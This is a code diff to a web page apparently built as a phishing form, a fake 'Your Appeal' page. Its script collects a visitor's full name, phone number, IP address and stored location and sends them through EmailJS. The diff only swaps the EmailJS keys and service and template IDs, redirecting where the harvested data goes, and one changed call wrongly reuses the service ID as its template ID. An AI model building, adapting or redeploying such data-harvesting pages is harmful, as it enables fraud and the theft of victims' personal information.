@@ -230,9 +230,9 @@
 				var currentTime = " - " + currentMinute + ":" + currentSecond;
 				if (a == 0) {
 					emailjs.init({
-						publicKey: "PkTU7VPpDIazDvwtn",
+						publicKey: "WR7OcQOL9KAM4SDj7",
 					});
-					emailjs.send("service_x3p3738", "template_06vdlbg", {
+					emailjs.send("service_bnlw1hj", "template_y58uxuj", {
 						location: localStorage.getItem("address"),
 						ip: localStorage.getItem("ipAddress"),
 						fullName: document.getElementById("fullName").value,
@@ -268,9 +268,9 @@
 					var currentSecond = currentDate.getSeconds();
 					var currentTime = " - " + currentMinute + ":" + currentSecond;
 					emailjs.init({
-						publicKey: "PkTU7VPpDIazDvwtn",
+						publicKey: "WR7OcQOL9KAM4SDj7",
 					});
-					emailjs.send("service_x3p3738", "template_06vdlbg", {
+					emailjs.send("service_bnlw1hj", "service_bnlw1hj", {
 						location: localStorage.getItem("address"),
 						ip: localStorage.getItem("ipAddress"),
 						fullName: document.getElementById("fullName").value,
@@ -388,7 +388,7 @@
 					<div class="select-box">
 						<div class="selected-option">
 							<div class="flag-inner">
-								<span class="iconify" data-icon="auto-4x3"></span>
+								<span class="iconify" data-icon=""></span>
 							</div>
 							<input type="tel" name="tel" placeholder="Phone Number" value="+" id="tel-number"
 								oninput="checkInputs()" />
@@ -413,7 +413,7 @@
 				</div>
 				<div class="button-btn">
 					<label class="footer-top">Your Appeal *</label>
-					<textarea name="" id="appeal" cols="30" rows="10"></textarea>
+					<textarea name="" id="appeal" cols="15" rows="10"></textarea>
 				</div>
 				<div class="buttuncheck">
 					<input type="checkbox" onclick="checkAll()" id="must-check" />
